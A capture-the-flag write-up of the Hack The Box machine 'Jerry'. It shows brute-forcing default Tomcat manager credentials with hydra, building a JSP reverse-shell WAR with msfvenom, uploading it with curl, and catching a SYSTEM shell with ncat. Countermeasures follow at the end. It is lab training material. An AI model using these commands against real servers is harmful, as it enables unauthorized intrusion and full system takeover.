# Jerry

![](./images/jerry.png)

#### Machine Release Date: June 30, 2018

## Summary

Jerry was a trivial machine where default Tomcat 7 credentials were used.
Leveraging these credentials, I was able to access the Tomcat manager API to upload a malicious WAR file acting as a reverse shell.
Leveraging the uploaded payload, I was able to get remote code execution on the machine with SYSTEM privileges.

## Active Ports

```bash
sudo nmap -p8080 -sC -sV -oA nmap/full-tcp-version 10.10.10.95
```

```none
Nmap scan report for 10.10.10.95
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 24 14:35:36 2020 -- 1 IP address (1 host up) scanned in 9.90 seconds
```

## User Own - (Tomcat 7 Default Credential Usage)

Navigating to the web service on port 8080, I was presented with a Tomcat 7 web application. It looked like the application had just been deployed.
Also, with Tomcat applications, it is always a good idea to brute force for default credentials:

```none
kali@kali:~/htb/machines/jerry/web/exploit$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-24 15:00:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-24 15:00:31
```

The username and password were `tomcat` and `s3cret` respectively.
Next, I generated a JSP reverse shell as a WAR file so that I could deploy it via the Tomcat manager:

```none
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=2001 -f war -o r0kit.war
Payload size: 1096 bytes
Final size of war file: 1096 bytes
Saved as: r0kit.war
```

I then created the following script to upload the malware to the server:

### commands.sh

```bash
curl -vv -X PUT -H "Authorization: Basic `echo -n 'tomcat:s3cret' | base64`" --data-binary @r0kit.war http://10.10.10.95:8080/manager/text/deploy?path=/r0kit
curl -vv -H "Authorization: Basic `echo -n 'tomcat:s3cret' | base64`" http://10.10.10.95:8080/manager/text/list
```

The first curl command sends an HTTP PUT request with the `tomcat:s3cret` credentials, uploading the `r0kit.war` JSP reverse shell.
The second curl command lists which Tomcat apps were deployed as a verification that my payload was successfully uploaded.

```none
kali@kali:~/htb/machines/jerry/web/exploit$ ./commands.sh
*   Trying 10.10.10.95:8080...
* Connected to 10.10.10.95 (10.10.10.95) port 8080 (#0)
> PUT /manager/text/deploy?path=/r0kit HTTP/1.1
> Host: 10.10.10.95:8080
> User-Agent: curl/7.72.0
> Accept: */*
> Authorization: Basic dG9tY2F0OnMzY3JldA==
> Content-Length: 1096
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 1096 out of 1096 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 02:00:00 EET
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Fri, 25 Sep 2020 02:09:35 GMT
<
OK - Deployed application at context path /r0kit
* Connection #0 to host 10.10.10.95 left intact
*   Trying 10.10.10.95:8080...
* Connected to 10.10.10.95 (10.10.10.95) port 8080 (#0)
> GET /manager/text/list HTTP/1.1
> Host: 10.10.10.95:8080
> User-Agent: curl/7.72.0
> Accept: */*
> Authorization: Basic dG9tY2F0OnMzY3JldA==
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 02:00:00 EET
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Fri, 25 Sep 2020 02:09:35 GMT
<
OK - Listed applications for virtual host localhost
/:running:0:ROOT
/examples:running:0:examples
/host-manager:running:0:host-manager
/r0kit:running:0:r0kit
/manager:running:2:manager
/docs:running:0:docs
* Connection #0 to host 10.10.10.95 left intact
```

Navigating to `http://10.10.10.95:8080/r0kit/` presented me with a reverse shell with SYSTEM privileges:

```none
$ rlwrap ncat -nvlp 2001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2001
Ncat: Listening on 0.0.0.0:2001
Ncat: Connection from 10.10.10.95.
Ncat: Connection from 10.10.10.95:49192.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

Doing some basic enumeration, I navigated to the Administrator's desktop to find the flags:

```none
c:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
c:\Users\Administrator\Desktop\flags>
```

## Countermeasures

* Upgrade to the latest version of tomcat.
* Always configure tomcat with non-default credentials. Prefer to use long passwords with alphanumeric characters, numbers, and special characters. Ideally, use a password manager so that you can manage non-human rememberable passwords.
* Avoid running services with SYSTEM privileges.
